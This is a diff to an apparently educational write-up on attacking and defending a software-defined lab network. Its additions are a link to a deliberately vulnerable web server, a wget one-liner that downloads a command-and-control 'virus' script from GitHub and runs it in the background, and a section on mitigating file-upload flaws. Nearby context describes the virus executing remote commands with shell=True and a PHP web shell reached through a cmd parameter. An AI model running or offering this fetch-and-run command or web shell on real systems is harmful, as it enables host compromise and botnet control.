@@ -54,7 +54,7 @@ We create the network with a python script available on [*GitHub*](https://raw.g
 
 We then want to make some hosts intentionally vulnerable to be compromised.
 
-On one host, we will install a vulnerable web application (DVWA - Damn Vulnerable Web Application).
+On one host, we will install a vulnerable web application, the source code of which is available on [*GitHub*](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/vuln-webserver.html).
 
 On the other host, we will install an SSH server with a weak password.
 
@@ -75,6 +75,12 @@ The virus is available on [*GitHub*](https://raw.githubusercontent.com/ozeliurs/
 This script runs indefinitely, it retrieves the command from the command and control server (`requests.get(url)`) and executes it (`subprocess.call(command, shell=True)`). The script then sleeps for 10 seconds between each command execution.
 
 The idea is that the attacker can host a simple page that will be read by the virus to execute commands on the compromised hosts.
+
+The virus can be launched on the compromised hosts using the following command:
+
+```bash
+wget wget https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/simple-virus.py -O virus.py && python3 virus.py &
+```
 
 # Host Compromise
 
@@ -122,7 +128,7 @@ Effective mitigation strategies include enforcing strong password policies, impl
 
 These measures collectively enhance security by reducing the risk posed by weak passwords and misconfigurations.
 
-## Exploiting a Vulnerability (e.g., SQLi, RFIs)
+## Exploiting a Vulnerability
 
 Poorly secured web applications can be exploited to compromise hosts. In this example, the web application allows us to upload files, which can be exploited to execute arbitrary commands on the server.
 
@@ -133,6 +139,14 @@ By uploading a PHP file (let's call it `exploit.php`) that allows command execut
 ```
 
 By accessing `http://<WEBSERVER_IP>/uploads/exploit.php?cmd=ls`, we see that the command `ls` is executed on the server and the output is displayed in the browser.
+
+### Mitication
+
+To mitigate such vulnerabilities, it is essential to keep web applications up to date, apply security patches promptly, and conduct regular security audits to identify and address potential vulnerabilities.
+
+In this case to patch the web application, we can check the file type and allow only specific file types to be uploaded. Additionally, we can verify that the size of the uploaded file does not exceed a certain limit. And finally sanitize the filename to prevent directory traversal attacks.
+
+The patched web application is available on [*GitHub*](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/patched-webserver.html).
 
 # Launching the Attack
 
